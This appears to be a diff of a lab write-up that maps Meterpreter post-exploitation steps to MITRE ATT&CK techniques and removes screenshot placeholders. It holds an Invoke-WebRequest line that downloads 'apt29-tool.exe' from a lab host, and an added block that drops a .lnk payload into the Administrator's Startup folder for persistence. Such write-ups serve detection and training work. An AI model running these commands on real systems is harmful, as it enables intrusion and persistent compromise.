@@ -197,8 +197,6 @@ net group "Domain Admins" /domain
 
 **Evidence:**
 
-> Add screenshot: net group output in the Meterpreter shell
-
 ![T1069 - Permission Groups](evidence/08-permission-groups.png)
 
 ---
@@ -218,8 +216,6 @@ Logon Server: \\WIN-DC01
 
 **Evidence:**
 
-> Add screenshot: systeminfo output in the Meterpreter shell
-
 ![T1082 - System Info](evidence/09-system-info.png)
 
 ---
@@ -232,8 +228,6 @@ tasklist
 
 **Evidence:**
 
-> Add screenshot: tasklist output in the Meterpreter shell
-
 ![T1057 - Process Discovery](evidence/10-process-discovery.png)
 
 ---
@@ -245,8 +239,6 @@ reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion
 ```
 
 **Evidence:**
-
-> Add screenshot: reg query output in the Meterpreter shell
 
 ![T1012 - Registry Query](evidence/11-registry-query.png)
 
@@ -262,8 +254,6 @@ reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion
 
 **Evidence:**
 
-> Add screenshot: 7z command running in the Meterpreter shell + zip file created
-
 ![T1560 - Archive Data](evidence/12-archive-data.png)
 
 ---
@@ -276,8 +266,6 @@ Invoke-WebRequest -Uri "http://192.168.10.102:8080/apt29-tool.exe" -OutFile "C:\
 
 **Evidence:**
 
-> Add screenshot: Kibana alert for T1105 with Invoke-WebRequest in the commandLine field
-
 ![T1105 - Tool Transfer](evidence/13-tool-transfer.png)
 
 ---
@@ -285,8 +273,11 @@ Invoke-WebRequest -Uri "http://192.168.10.102:8080/apt29-tool.exe" -OutFile "C:\
 ### T1547.009 — Startup Folder Persistence
 
 ```powershell
-Copy-Item "C:\Users\Public\payload.lnk" `
-  "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
+# Extract zip
+Expand-Archive -Path "C:\Users\Administrator\Downloads\ds7002.zip" -DestinationPath "C:\Users\Administrator\Downloads\ds7002\" -Force
+
+# Copy LNK to Startup
+Copy-Item "C:\Users\Administrator\Downloads\ds7002\ds7002.lnk" "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
 ```
 
 **Evidence:**
